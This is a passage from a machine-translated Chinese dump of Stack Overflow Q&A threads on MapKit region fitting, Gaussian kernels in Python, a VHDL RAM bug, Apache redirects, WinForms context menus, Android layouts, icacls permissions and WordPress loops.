如果您准备近似计算，您可以使用一些巧妙的缩放来完成。

您的目标区域是 380 的 mapView 中的 80 高。因此，您需要一个比计算出的适合您的注释的区域高 4.75 倍的区域。（以上额外 0.25，以下额外 3.5）。

首先，您需要获得一个区域（或 maprect，无论您喜欢在哪个区域工作）并使其与目标可视区域的比例相同。这是因为一个非常宽和短的区域不会触及可视区域的顶部和底部，因此乘以它的高度不会使某些东西触及地图视图的顶部和底部。所以如果`viewable_height/viewable_width > annotations_height/annotations_width`你应该设置`annotations_height`为`annotations_width * (viewable_height/viewable_width)`.

然后，您在注释框的北边添加 25%，在南边添加 350%。您可以通过将中心向南移动 212.5%（当前高度）并将垂直跨度增加 475% 来做到这一点。

现在，考虑到世界是球体并且我们不是在看平面投影（即赤道附近的 1 度纬度小于两极附近的 1 度），所有这些都是近似值。但是如果你想要准确的话，你可以考虑根据纬度等来缩放数字。如果您只处理城市规模的注释，您可能会没事。

希望有帮助。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-22T08:34:10.440

如果要查找给定矩形中的注释：

```
- (NSArray*)allAnnotationsInMapRect:(MKMapRect)mapRect {
    NSMutableArray *annotationsInRect = [NSMutableArray array];
    for(id<MKAnnotation *ann in self.allAnnotations) {
        MKMapPoint pt = MKMapPointForCoordinate(ann.coordinate);
        if(MKMapRectContainsPoint(mapRect, pt)) {
            [annotationsInRect addObject:ann];
        }
    }

    return annotationsInRect;
} 
```

并确保注释视图在矩形中，获取注释区域，然后遍历它们并获取每个视图的边界，看看边界是否适合地图的可见矩形，如果不修改该区域！

~~ 像这样：

```
- (void)assureAnnotationViewsAreVisible:(NSArray*)annotations originalRegion:(MKCoordinateRegion)originalRegion {
    CGFloat smallestX = MAXFLOAT;
    CGFloat smallestY = MAXFLOAT;
    CGFloat biggestX = -100;
    CGFloat biggestY = -100;

    //NSLog(@"---: %d", annotations.count);
    for(id<MKAnnotation> *annotation in annotations) {
        UIView *annotationView = [self.mapView viewForAnnotation:v];

        CGRect annotationViewFrame = annotationView.bounds;
        annotationViewFrame.origin = [self.mapView convertCoordinate:annotationView.coordinate toPointToView:self.mapView];
        annotationViewFrame.origin = CGPointMake(annotationViewFrame.origin.x-annotationViewFrame.size.width/2,
                                                 annotationViewFrame.origin.y-annotationViewFrame.size.height);

        smallestX = MIN(annotationViewFrame.origin.x, smallestX);
        smallestY = MIN(annotationViewFrame.origin.y, smallestY);
        biggestX = MAX(annotationViewFrame.origin.x+annotationViewFrame.size.width, biggestX);
        biggestY = MAX(annotationViewFrame.origin.y+annotationViewFrame.size.height, biggestY);
    }
    //NSLog(@"---");

    CGRect bounds = self.mapView.bounds;
    if(smallestX < bounds.origin.x || smallestY < bounds.origin.y || biggestX > bounds.origin.x+bounds.size.width || biggestY > bounds.origin.y+bounds.size.height) {
        CGRect neededRect = bounds;
        neededRect.origin = CGPointMake(MIN(bounds.origin.x, smallestX), MIN(bounds.origin.y, smallestY));
        neededRect.size = CGSizeMake(MAX(bounds.size.width, biggestX), MAX(bounds.size.height, biggestY));

        MKCoordinateRegion neededRegion = [self.mapView convertRect:neededRect toRegionFromView:self.mapView];
        _ignoreRegionChange = YES;
        [self.mapView setRegion:originalRegion animated:NO];
        _ignoreRegionChange = NO;
        [self.mapView setRegion:neededRegion animated:YES];
    }
    else {
        MKCoordinateRegion currentRegion = self.mapView.region;
        _ignoreRegionChange = YES;
        [self.mapView setRegion:originalRegion animated:NO];
        _ignoreRegionChange = NO;
        [self.mapView setRegion:currentRegion animated:YES];
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-03-21T04:17:26.777

您首先需要添加注释：（当然这是在您已经拥有注释列表之后）

> 斯威夫特4：

```
 self.mapView.addAnnotations(annotations)
    let currentView = mapView.visibleMapRect
    mapView.annotations(in: currentView) 
```

您可以使用 currentView 常量或直接放置 MKMapRect 如下： (.visibleMapRect 返回：

“地图视图当前显示的区域。”

```
mapView.annotations(in: mapView.visibleMapRect) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-06-03T03:39:45.873

我发现了一种不计算的更简单的方法是让地图视图计算它，然后我们调整边缘。

```
//1: Show all annotation on the map view, but without animation
self.mapView.showAnnotations(self.mapView.annotations, animated: false)

//2: Get the current visible map rect
let currentMapRect = self.mapView.visibleMapRect

//3: Create the edges inset that you want the map view to show all annotation within
let padding = UIEdgeInsets(top: 100, left: 100, bottom: 100, right: 100)

//4: Set current map rect but with new padding, also set animation to true to see effect
self.mapView.setVisibleMapRect(currentMapRect, edgePadding: padding, animated: true) 
```

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2013-02-16T23:34:47.320

尝试从 lan 和 lon 的所有注释边缘值（最大值和最小值）中获取。

在开头定义这个值：

```
static float maxLat = FLT_MIN;
static float maxLon = FLT_MIN;
static float minLat = FLT_MAX;
static float minLon = FLT_MAX; 
```

然后使用此函数计算跨度和区域：

```
- (void) zoomAndFit {
    for(int i = 0; i < [self.points count]; i++) {
        PRPlaceModel *place = [self.points objectAtIndex:i];
        CLLocationCoordinate2D location; 
        location.latitude = [place.lat floatValue];
        location.longitude = [place.lon floatValue];
        minLat = MIN(minLat, location.latitude);
        minLon = MIN(minLon, location.longitude);
        maxLat = MAX(maxLat, location.latitude);
        maxLon = MAX(maxLon, location.longitude);
    }
    MKCoordinateRegion region; 
    MKCoordinateSpan span; 
    span.latitudeDelta = 1.2*(maxLat - minLat); 
    span.longitudeDelta = 1.2*(maxLon - minLon);

    CLLocationCoordinate2D location; 
    location.latitude = (minLat + maxLat)/2;
    location.longitude = (minLon + maxLon)/2;

    region.span=span; 
    region.center=location; 
    [self.mapView setRegion:region animated:TRUE]; 
    [self.mapView regionThatFits:region]; 
} 
```

并在 viewDidLoad 方法中使用它：

```
-(void)viewDidLoad
{
    [super viewDidLoad];
    [self zoomAndFit];
} 
```

# python - 生成一维高斯核的最简单方法

> ID：14916085
> 
> 赞同：8
> 
> 时间：2013-02-16T23:00:26.550
> 
> 标签：python, image-processing, computer-vision

我想知道在给定滤波器长度的情况下，在 python 中生成一维高斯内核的最简单方法是什么。我认为这个想法是评估向量 [-filter-length,...,filter_length] 值的正态分布，是否正确？

到目前为止，我已经这样做了，但我不知道为什么它不正确：

```
result = np.zeros( filter_length )

mid = filter_length/2
result=[(1/(sigma*np.sqrt(2*np.pi)))*(1/(numpy.exp((i**2)/(2*sigma**2)))) for i in range(-mid,mid+1)]  

return result 
```

其中`sigma`是标准差，它是一个参数。`filter-length`也是一个参数。

这是不正确的，因为我得到了，例如，对于 length=3 和**sigma=math.sqrt(1.0/2/math.log(2))**

[0.23485931967491286, 0.46971863934982572, 0.23485931967491286]

它应该是：

[0.25, 0.5, 0.25]

那么，有没有四舍五入的问题？我不知道发生了什么事...

**编辑**我认为我应该以某种方式截断

**问题已解决**问题是我没有正常化。我必须将向量除以其所有分量的总和。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-16T23:09:53.850

我对 numpy 语法不是很坚定，但是如果你用狄拉克脉冲对内核进行卷积，你会得到与输出相同的内核。

所以你可以简单地使用 inbuild [scipy.ndimage.filters.gaussian_filter1d](http://docs.scipy.org/doc/scipy/reference/generated/scipy.ndimage.filters.gaussian_filter1d.html#scipy.ndimage.filters.gaussian_filter1d)函数，并使用这个数组作为输入： [ 0, 0, 0, ... 0, 1, 0, ...0, 0, 0]

输出应该是一个高斯核，峰值为 1。（将 1 替换为所需内核中所需的最大值）

所以本质上，你会得到 gaussian_filter1d 函数内部使用的高斯核作为输出。这应该是生成高斯核的最简单且最不容易出错的方法，您可以使用相同的方法生成 2d 内核，并使用相应的 scipy 2d 函数。当然，如果目标是从头开始，那么这种方法也只能作为参考

*关于您的方程式：*
要获得 [..., 0.5, ...] 作为公式的输出，您需要求解
`(1/(sigma*np.sqrt(2*np.pi)) = 0.5`
，因此正确的 sigma 应该是
`sigma = math.sqrt(2*1/np.pi)`

# vector - 未分配 std_logic 向量（15 到 0）值

> ID：14916088
> 
> 赞同：1
> 
> 时间：2013-02-16T23:00:40.207
> 
> 标签：vector, variable-assignment, vhdl

所以，长话短说，我正在尝试制作一个处理器（'of sorts' 放在那里是有原因的，但我们不去详细说明），我遇到了一个几乎毁了整个处理器的问题事物。

即，在这段代码中：

```
programmProcess: process (clk,rst) is
    variable counter : natural;
begin
    if (rst = '1') then
        counter := 0;
    elsif (clk'event and clk = '1' and pm_nEn= '1') then
        RAM(counter) <= data; --This is where the issue is
        counter := counter + 1;
        if (counter = 1024) then
            counter := 0;
        end if;
    end if;
    data <= "ZZZZZZZZZZZZZZZZ";
end process programmProcess; 
```

...这是测试平台过程：

```
 stim_proc1: process 
 begin  
    rst <= '1';
    pm_nEn <= '1';
    wait for clk_period;

    rst <= '0' ;

    data <="0000111110111001";
    wait for clk_period;

    data <="0000111010111001";
    wait for clk_period;

    data <= "ZZZZZZZZZZZZZZZZ";
    pm_nEn <= '0';
    wait for 10*clk_period;
    wait;
end process; 
```

...其中 RAM 是 1024 个 16 位向量的数组，数据是 16 位输入输出向量，而 pm_nEn 是单个位，它基本上允许 RAM 填充值。

这个想法是 RAM(counter) 从数据向量中获取值，这是在测试台中手动输入的值，但这不会发生。也就是说，尽管数据具有所需的值，但所有 RAM 的值都只是保持“UUUUUUUUUUUUUUUU”。即使第一次评估并且计数器为 0，RAM(0) 也是未定义的。

我正在使用 ISE 套件，我尝试模拟，然后只是跟踪所有步骤，并显示 RAM(counter) 应该被分配一个值的步骤，数据向量确实具有手动添加的值测试台，但 RAM 仍然没有得到任何值。

所以，问题基本上是 - 为什么会发生这种情况？为什么 RAM 没有分配它的值？

此外，这里是谷歌文档形式的完整 VHDL 和测试平台（由 ISE 方便地生成） -

[高密度脂蛋白](https://docs.google.com/document/d/1C1zestA8phlmMsft-FtIUnOUCILg3dG717w0XBkVohs/edit?pli=1)

[试验台](https://docs.google.com/document/d/16zCqM6nWYGRZXOh0GeZd8wNYcTv5L5ge8JlZzm22g6o/edit)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-16T23:41:38.877

在主进程中将“zzzz”分配给 Data 应该没有害处（尽管在当前的代码片段中，它是多余的）。

*可能*导致合成问题的一件事是：

```
 elsif (clk'event and clk = '1' and pm_nEn= '1') then
    ... actions
 end if; 
```

为了匹配合成工具期望的时钟处理模式，最好编写

```
 elsif clk'event and clk = '1' then
    if pm_nEn= '1' then
       ... actions
    end if;
 end if; 
```

尽管我希望这两个版本在模拟中是等效的。在另一个进程中，RAM 上没有另一个驱动程序，是吗？

编辑：显然在另一个进程中有一个单独的驱动程序设置 RAM。现在从软件的角度来看，您可能认为这没问题，因为一个进程驱动 when`en = '0'`和另一个 when `en = '1'`。但是，您不能使驱动程序硬件在布尔值轻弹时出现和消失；RAM 信号上总是有两个驱动程序。而您没有明确使用的是将值保存为“UUUU”。

最好的办法是消除其中一个。让一个或另一个进程负责写入 RAM。我将使用这个过程；使用其他流程，您可能会发现设计更干净整洁；那也没关系。

这很容易：只需按照以下方式重新组织此过程：

```
 elsif clk'event and clk = '1' then
    if pm_nEn= '1' then
       ... actions
    else    -- or elsif external_enable then 
       RAM(external_address) <= external_data;
    end if;
 end if; 
```

顺便说一句，当您看到这样的表达式时`RAM(to_integer(unsigned(R(to_integer(unsigned(IR(5 downto 3))))))) <= std_logic_vector(signed(OP1) + signed(OP2));` ，通常会暗示某些东西首先被声明为错误的类型：例如，OP1 和 OP2 可能应该是有符号的，R 应该是一个整数数组，等等。如果你不能消除所有的丑陋，你至少可以使用辅助函数（可能在一个包中）阻止它干扰主程序流：

```
function gen_reg_addr(IR : Register) return natural is ...

RAM(gen_reg_addr(IR)) <= ... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-16T23:05:43.753

我想问题出在你写信的地方很多`data`。如果您有多个语句写入同一个变量，我不会感到惊讶，这应该会导致模拟器给它一个`Z`.

例如，您的一个流程如下所示：

```
glavenProcess: process (clk,rst) is
begin
    data <= "ZZZZZZZZZZZZZZZZ";
    ...
end process; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-16T23:23:11.793

抱歉耽搁了，我发现了您的问题，将 RAM 更改为变量而不是 Signal，查看 VHDL 手册以查看信号和变量之间的差异：

```
 library IEEE;
use IEEE.std_logic_1164.all;
use  ieee.numeric_std.all;

entity mp is
    port(
        clk, rst, pm_nEn : in std_logic;
        data : inout std_logic_vector(15 downto 0);
       adr : out std_logic_vector(15 downto 0);
       rd_nwr : out std_logic
    );
end entity mp;

architecture beh of mp is
    signal PC, IR, OP1, OP2 : std_logic_vector(15 downto 0);
    type csignals is array(7 downto 0) of std_logic_vector(15 downto 0);
    signal R: csignals;

    type memory_array is array(1024 downto 0) of std_logic_vector(15 downto 0);
      shared variable RAM: memory_array;
begin                    

    glavenProcess: process (clk,rst) is
    begin
         data <= "ZZZZZZZZZZZZZZZZ";
        if (rst = '1') then
            PC <= "0000000000000000";
             R(0) <= "0000000000000000";
            R(1) <= "0000000000000000";
            R(2) <= "0000000000000000";
            R(3) <= "0000000000000000";
            R(4) <= "0000000000000000";
            R(5) <= "0000000000000000";
            R(6) <= "0000000000000000";
            R(7) <= "0000000000000001";
        elsif (clk'event and clk = '1' and pm_nEn= '0') then
            IR <= RAM(to_integer(unsigned(PC)));
            if (IR(15) = '0') then
                if (IR(14) = '0') then
                        OP1 <= R(to_integer(unsigned(IR(11 downto 9))));
                else
                        OP1 <= RAM(to_integer(unsigned(R(to_integer(unsigned(IR(11 downto 9)))))));
                end if;

                  if (IR(13) = '0') then
                        OP2 <= R(to_integer(unsigned(IR(8 downto 6))));
                else
                         if (IR(0) = '0') then
                                     adr <= R(to_integer(unsigned(IR(8 downto 6))));
                                     OP2 <= data;
                                     rd_nwr <= '1' ;
                         else
                                     OP2 <= RAM(to_integer(unsigned(R(to_integer(unsigned(IR(8 downto 6)))))));
                         end if;
                end if;

                if (IR(2) = '1') then OP2 <= not OP2 ; end if;
                if (IR(1) = '1') then OP1 <= not OP1 ; end if;

                  if (IR(0) = '0') then
                         if (IR(12) = '0') then
                                 R(to_integer(unsigned(IR(5 downto 3)))) <= std_logic_vector(signed(OP1) + signed(OP2));
                         else
                                 RAM(to_integer(unsigned(R(to_integer(unsigned(IR(5 downto 3))))))) := std_logic_vector(signed(OP1) + signed(OP2));
                         end if;
                   else
                         if (IR(12) = '0') then
                                 adr <= R(to_integer(unsigned(IR(5 downto 3))));
                         else
                                 adr <= RAM(to_integer(unsigned(R(to_integer(unsigned(IR(5 downto 3)))))));
                         end if;
                         data <= std_logic_vector(signed(OP1) + signed(OP2));
                         rd_nwr <= '0' ;
                   end if;
                PC <= std_logic_vector(unsigned(PC) + 1);
             else
                 if (IR(8 downto 7) = "00") then
                         if (R(to_integer(unsigned(IR(11 downto 9)))) = R(to_integer(unsigned(IR(6 downto 4))))) then
                                 PC <= R(to_integer(unsigned(IR(14 downto 12))));
                         end if;
                 elsif (IR(8 downto 7) = "01") then
                         if (R(to_integer(signed(IR(11 downto 9)))) > R(to_integer(signed(IR(6 downto 4))))) then
                                 PC <= R(to_integer(unsigned(IR(14 downto 12))));
                         end if;
                 elsif (IR(8 downto 7) = "10") then
                         if (R(to_integer(signed(IR(11 downto 9)))) < R(to_integer(signed(IR(6 downto 4))))) then
                                 PC <= R(to_integer(unsigned(IR(14 downto 12))));
                         end if;
                 elsif (IR(8 downto 7) = "11") then
                     if ( not R(to_integer(signed(IR(11 downto 9)))) = R(to_integer(signed(IR(6 downto 4))))) then
                                 PC <= R(to_integer(unsigned(IR(14 downto 12))));
                         end if;
                 end if;
             end if;
         end if;
    end process glavenProcess;

    programmProcess: process (clk,rst) is
        variable counter : natural;
    begin
        if (rst = '1') then
            counter := 0;
        else 
            if (clk'event and clk = '1' and pm_nEn= '1')  then
            RAM(counter) := data;
            counter := counter + 1;                       
            if (counter = 1024) then counter := 0; end if;
        end if;

        end if;

    end process programmProcess;
end architecture beh; 
```

试验台：

```
library ieee;
use ieee.numeric_std.all;
use ieee.std_logic_1164.all;

    -- Add your library and packages declaration here ...

entity mp_tb is
end mp_tb;

architecture TB_ARCHITECTURE of mp_tb is
    -- Component declaration of the tested unit
    component mp
    port(
        clk : in STD_LOGIC;
        rst : in STD_LOGIC;
        pm_nEn : in STD_LOGIC;
        data : inout STD_LOGIC_VECTOR(15 downto 0);
        adr : out STD_LOGIC_VECTOR(15 downto 0);
        rd_nwr : out STD_LOGIC );
    end component;

    -- Stimulus signals - signals mapped to the input and inout ports of tested entity
    signal clk : STD_LOGIC;
    signal rst : STD_LOGIC;
    signal pm_nEn : STD_LOGIC;
    signal data : STD_LOGIC_VECTOR(15 downto 0);
    -- Observed signals - signals mapped to the output ports of tested entity
    signal adr : STD_LOGIC_VECTOR(15 downto 0);
    signal rd_nwr : STD_LOGIC;

    -- Add your code here ...

begin

    -- Unit Under Test port map
    UUT : mp
        port map (
            clk => clk,
            rst => rst,
            pm_nEn => pm_nEn,
            data => data,
            adr => adr,
            rd_nwr => rd_nwr
        );   
        clock:process is
        begin           

           clk<='0';
           wait for 10 ns;
           clk<='1';
           wait for 10 ns;

        end process;
process is
begin
rst <= '1';
    pm_nEn <= '1';

    wait  for 25 ns;
    rst <= '0' ;
    data <="0000111110111001";

    wait  for 45 ns;

    data <="0000111010111001";

    wait  for 55 ns;
    data <= "ZZZZZZZZZZZZZZZZ";
    pm_nEn <= '0';

    wait;
end process;
end TB_ARCHITECTURE;

configuration TESTBENCH_FOR_mp of mp_tb is
    for TB_ARCHITECTURE
        for UUT : mp
            use entity work.mp(beh);

        end for;
    end for;
end TESTBENCH_FOR_mp; 
```

# apache - 301重定向重写不起作用

> ID：14916100
> 
> 赞同：0
> 
> 时间：2013-02-16T23:01:41.470
> 
> 标签：apache, .htaccess, mod-rewrite, http-status-code-301, http-redirect

我有几个正在工作的重定向，例如这两个：

```
 #Options +FollowSymlinks
    RewriteEngine On

    #fishing report
    RewriteCond %{HTTP_HOST}  ^saintsimonsislandcharterfishing\.com$ [NC]
    RewriteCond %{QUERY_STRING}  ^$
    RewriteRule ^Fishing(?:[\ +]|%20)Report\.html$ http://www.charterfish.com/category/georgia-fishing-reports/? [R=301,NE,NC,L]

    #shark and tarpon
    RewriteCond %{HTTP_HOST}  ^saintsimonsislandcharterfishing\.com$ [NC]
    RewriteCond %{QUERY_STRING}  ^$
    RewriteRule ^shark(?:[\ +]|%20)and(?:[\ +]|%20)tarpon\.html$ http://www.charterfish.com/st-simons-shark-and-tarpon-fishing-charters/? [R=301,NE,NC,L] 
```

但是，此重定向将原始 html 页面作为请求发送到新服务器：

```
 #about the captain
    RewriteCond %{HTTP_HOST}  ^saintsimonsislandcharterfishing\.com$ [NC]
    RewriteCond %{QUERY_STRING}  ^$
    RewriteRule ^About(?:[\ +]|%20)The(?:[\ +]|%20)Captain\.html$ http://www.charterfish.com/captain-tj-cheek/? [R=301,NE,NC,L] 
```

`http://saintsimonsislandcharterfishing.com/About%20The%20Captain.html`

正在重定向到：

`http://www.charterfish.com/About%20The%20Captain.html`

代替

`http://www.charterfish.com/captain-tj-cheek/`

正则表达式看起来是正确的，我错过了什么？

# c# - 单击鼠标右键时，我刚刚在 listBox 中添加了一个上下文，但它无法正常工作

> ID：14916102
> 
> 赞同：1
> 
> 时间：2013-02-16T23:01:49.080
> 
> 标签：c#, winforms

这是代码。在 Form1 加载事件中：

```
private void Form1_Load(object sender, EventArgs e)
{
    if (listBox1.Items != null && listBox1.Items.Count > 0)
    {
        listBox1.Select();
        label4.Text = listBox1.SelectedItem.ToString();
        string startTag = "Url: ";
        string endTag = " ---";
        int startTagWidth = startTag.Length;
        int endTagWidth = endTag.Length;
        int index = 0;
        index = label4.Text.IndexOf(startTag, index);
        int start = index + startTagWidth;
        index = label4.Text.IndexOf(endTag, start + 1);
        string g = label4.Text.Substring(start, index - start);
        label4.Text = g;
        mainUrl = g;
        listboxContextMenu = new ContextMenuStrip();
        listboxContextMenu.Opening += new CancelEventHandler(listboxContextMenu_Opening);
    }
} 
```

然后是 listBox mouseDown 事件：

```
private void listBox1_MouseDown(object sender, MouseEventArgs e)
{
    if (e.Button == System.Windows.Forms.MouseButtons.Right)
    {
        int index = listBox1.IndexFromPoint(e.Location);
        {
            if (index == listBox1.SelectedIndex)
            {
                listboxContextMenu.Show();
            }
        }
    }
} 
```

然后是开幕式：

```
private void listboxContextMenu_Opening(object sender, CancelEventArgs e)
{
    //clear the menu and add custom items
    listboxContextMenu.Items.Clear();
    listboxContextMenu.Items.Add(string.Format("Edit - {0}", listBox1.SelectedItem.ToString()));
} 
```

它的作用是，当我在鼠标右键单击 listBox 中的特定项目时，它会显示 contextMenu。

问题是 contextMenu 一直显示在左上角的屏幕上，而不是 Form，而是屏幕左上角。

第二个问题是，仅在我第二次单击所选项目时才显示联系菜单。当我运行我的程序时，listBox 中的第一项已被选中，但仅当我在该项目上单击两次时才会显示 contect 菜单。之后我每次单击一次，但第一次运行我的程序时，我需要在我的右键单击上单击两次。

我该如何解决这两个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:13:52.803

使用`MouseUp Event`代替`MouseDown Event`

```
 private void listBox1_MouseUp(object sender, MouseEventArgs e)
    {
        if (e.Button == System.Windows.Forms.MouseButtons.Right)
        {
            int index = listBox1.IndexFromPoint(e.Location);
            if (index == - 1) return;
            listBox1.SelectedIndex = index;
            listboxContextMenu.Show(listBox1, listBox1.PointToClient(System.Windows.Forms.Cursor.Position));
        }
    } 
```

# android - 代码在 Android 4.1.1 中不起作用

> ID：14916121
> 
> 赞同：0
> 
> 时间：2013-02-16T23:04:33.410
> 
> 标签：android, android-layout

我正在做一些非常基本的事情，比如在屏幕上添加一个按钮。该代码在 Andorid 2.3 中运行良好，但在 Android 4.1.1 中无法运行。

```
RelativeLayout mainLayout = new RelativeLayout(this);
mainLayout.setLayoutParams(new RelativeLayout.LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT));

ImageView titleView = new ImageView(this);
Bitmap _bitmap = returnScaledBitmap(R.drawable.headertext, display.getWidth()*50/100,display.getHeight()*15/100);
titleView.setImageBitmap(_bitmap);
titleView.setId(R.drawable.headertext);
RelativeLayout.LayoutParams textLayout = new RelativeLayout.LayoutParams(RelativeLayout.LayoutParams.WRAP_CONTENT,RelativeLayout.LayoutParams.WRAP_CONTENT);
textLayout.addRule(RelativeLayout.ALIGN_PARENT_TOP);
titleView.setPadding(display.getWidth()*35/100, display.getWidth()*1/100,display.getWidth()*1/100,display.getWidth()*1/100);
titleView.setLayoutParams(textLayout);

mainLayout.addView(titleView);
setContentView(mainLayout); 
```

此代码在 2.3.3 的 HTC EVO 4G 上运行良好。但不是在运行 4.1.1 的三星 Galaxy S3 上。这是我的清单

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="org.myorg"
    android:versionCode="6"
    android:versionName="1.0"
    android:icon="@drawable/icon"
    android:installLocation="preferExternal"
     >

    <uses-sdk android:minSdkVersion="10" />
    <application
        android:icon="@drawable/icon"
        android:label="@string/app_name" android:logo="@drawable/icon" android:debuggable="false">
        <activity
            android:screenOrientation="landscape"
            android:label="@string/app_name"
            android:name=".splash" >
            <intent-filter >
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <activity android:name=".homepage"
            android:screenOrientation="landscape">
        </activity>
    </application>
<uses-permission android:name="android.permission.VIBRATE"></uses-permission>
</manifest> 
```

请告诉我我做错了什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:12:35.500

你的代码不是很清楚，但我认为你做错了： `mainLayout.addView(titleView);`我想你想写`textLayout.addView(titleView);`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-18T01:16:33.870

我遇到了完全相同的问题，经过数小时尝试不同的事情，这是唯一对我有用的事情：

在使用 ImageView 之前尝试此操作（您可能还必须在清单中将 minSDKVersion 设置为至少 11）。

```
myImageView.setLayerType(View.LAYER_TYPE_SOFTWARE, null); 
```

我从这里的用户那里得到了解决方案，dicenice，在[这个](https://stackoverflow.com/questions/12400909/images-not-showing-up-in-jellybean-work-fine-in-all-other-releases/14928114#14928114)线程上

# windows - 使用 Icacls 设置文件和文件夹权限

> ID：14916122
> 
> 赞同：1
> 
> 时间：2013-02-16T23:04:33.510
> 
> 标签：windows

嗨，我管理着一所相当大的学校，我想使用 Icacls 在我们运行 XP Service Pack 3 的许多机器上设置权限。我想设置开始菜单中的管理工具文件夹，以便学生无法打开该文件夹，但只有管理员可以。我遇到语法问题。我已经看到许多使用重置继承的开关的示例，但它似乎无法正常工作。下面是我正在使用的。欢迎任何帮助。谢谢。

```
Icacls "c:\Documents and Settings\All Users\Start Menu\Programs\Admistrative Tools" /inheritance:r /grant:r "Administrator":(OI)(CI)F 
```

我收到了“/inheritance:f”的无效参数错误，我基于本文的上述内容。[http://technet.microsoft.com/en-us/magazine/2009.07.geekofalltrades.aspx](http://technet.microsoft.com/en-us/magazine/2009.07.geekofalltrades.aspx)

# html - 不同 DIV 中每个类别的 Wordpress 帖子

> ID：14916124
> 
> 赞同：0
> 
> 时间：2013-02-16T23:04:51.510
> 
> 标签：html, wordpress

我有一个wordpress问题。我试图让三个 div 在用户单击链接时切换可见性。我的问题是每个 WP_Query 的所有结果都在`HomeDisplaySel`div 下。我计算了每个 div 的开始和结束位置，甚至添加了额外的结束 div，但没有任何效果。我不能将每个帖子类别分成不同的 div。谢谢您的帮助。

```
<div id="HomeDisplaySel">
    <?php $AllPostsArgs = array ('posts_per_page' => 6, 'category' => 'posts'); ?>
    <?php $AllPosts = new WP_Query($AllPostsArgs); ?>
    <?php while($AllPosts->have_posts()) : $AllPosts->the_post(); ?>
    <a href="<?php the_permalink(); ?>"><h1><?php the_title(); ?></h1></a>
    <div id="Author">
    <?php $authID = get_the_author_meta('ID'); ?>
    <?php echo get_avatar($authID); ?>
    <h5><?php the_author();?></h5><br />
    <h5><?php the_author_meta('user_description'); ?></h5>
    </div>
    <h4>Posted on <?php the_time('F jS, Y') ?></h4>
    <br />
    <p><?php the_excerpt(__('(more...)')); ?></p>
    <hr>
    <?php endwhile; ?>
</div>

<div id="WKTSel">
    <?php $AllPostsArgs = array ('posts_per_page' => 6, 'category' => 'workouts'); ?>
    <?php $WKTS = new WP_Query("posts_per_page=6&category=workouts"); ?>
    <?php while($WKTS->have_posts()) : $$WKTS->the_post(); ?>
    <a href="<?php the_permalink(); ?>"><h1><?php the_title(); ?></h1></a>
    <h4>Posted on <?php the_time('F jS, Y') ?></h4>
    <br />
    <p><?php the_excerpt(__('(more...)')); ?></p>
    <hr>
    <?php endwhile; ?>
</div>

<div id="THPYSel">
    <?php $AllPostsArgs = array ('posts_per_page' => 6, 'category' => 'therapy'); ?>
    <?php $WKTS = new WP_Query("posts_per_page=6&category=workouts"); ?>
    <?php while($WKTS->have_posts()) : $$WKTS->the_post(); ?>
    <a href="<?php the_permalink(); ?>"><h1><?php the_title(); ?></h1></a>
    <h4>Posted on <?php the_time('F jS, Y') ?></h4>
    <br />
    <p><?php the_excerpt(__('(more...)')); ?></p>
    <hr>
    <?php endwhile; ?>
</div> 
```

编辑

当我在 chrome 中查看源代码时，这就是我所看到的。

```
<!-- Home Page -->

<html>
<head>
<meta name="viewport" content="width=device-width" />
<title> | The MindStream Academy Blog</title>
<link href='http://fonts.googleapis.com/css?family=Monda' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="http://localhost:8888/MindstreamBlog/wp-content/themes/mindstream/style.css" />
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script type="text/javascript" src="changehome.js"></script>
</head>
<body>
<div id="wrapper">
<div id="header">
<img src="http://localhost:8888/MindstreamBlog/wp-content/uploads/2013/01/logo.png" alt="MindStream_Academy_Logo" id="logo" />
</div><div id="sidebar">
<li class="page_item page-item-8"><a href="http://localhost:8888/MindstreamBlog/?page_id=8">Home</a></li>
<li class="page_item page-item-9"><a href="http://localhost:8888/MindstreamBlog/?page_id=9">About</a></li>
<li class="page_item page-item-11"><a href="http://localhost:8888/MindstreamBlog/?page_id=11">Students</a></li>
<li class="page_item page-item-14"><a href="http://localhost:8888/MindstreamBlog/?page_id=14">Archives</a></li>
<li class="page_item page-item-13"><a href="http://localhost:8888/MindstreamBlog/?page_id=13">Fan Mail</a></li>
<li class="page_item page-item-16"><a href="http://localhost:8888/MindstreamBlog/?page_id=16">Contact</a></li>
</div><div id="main">
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script type="text/javascript" src="changehome.js"></script>
<div class="col">
<div class="ChangeHome">
<h2><a href='#' id='LoadRP'>Recent<br />Posts</a></h2>
</div>
<div class="ChangeHome">
<h2><a href='#' id='LoadWOTW'>Workout of<br />the Week</a></h2>
</div>
<div class="ChangeHome">
<h2><a href='#' id='LoadWT'>Weekly Therapy</a></h2>
</div>
</div>

<div id="HomeDisplaySel">
                <a href="http://localhost:8888/MindstreamBlog/?p=43"><h1>Workout #1</h1></a>
    <div id="Author">
        <img width="96" height="96" src="http://localhost:8888/MindstreamBlog/wp-content/uploads/2013/01/Ian-clarke-headshot-1-150x150.png" class="avatar avatar-96 photo wp-post-image" alt="" />  <h5>Hunter Willis</h5><br />
    <h5>2012 Fall &amp; Spring</h5>
    </div>
    <h4>Posted on February 16th, 2013</h4>
    <br />
    <p><p>Hey all. How is everyone? Pumped? I know I am! Here is a workout for your arms and core to [...]</p>
</p>
    <hr>
        <a href="http://localhost:8888/MindstreamBlog/?p=36"><h1>Test 3</h1></a>
    <div id="Author">
